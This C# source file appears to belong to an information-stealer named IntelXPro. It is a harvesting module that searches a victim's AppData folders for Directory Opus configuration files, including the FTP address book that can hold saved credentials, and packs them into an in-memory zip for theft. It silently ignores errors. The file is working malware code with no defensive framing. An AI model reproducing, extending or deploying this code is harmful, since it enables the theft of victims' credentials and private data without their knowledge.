using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class DirectoryOpus : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GPSoftware", "Directory Opus");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "GPSoftware", "Directory Opus");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "DirectoryOpus";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "ConfigFiles\\dopus.oxc",
                    "ConfigFiles\\state.osd",
                    "ConfigFiles\\favorites.ofv",
                    "ConfigFiles\\ftpaddressbook.oxc"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\DirectoryOpus\\{location}\\{configFile.Replace("\\", "/")}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string configFilesPath = Path.Combine(basePath, "ConfigFiles");
                if (Directory.Exists(configFilesPath))
                {
                    string[] allConfigFiles = Directory.GetFiles(configFilesPath, "*.o*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in allConfigFiles.Take(15))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\DirectoryOpus\\{location}\\ConfigFiles\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
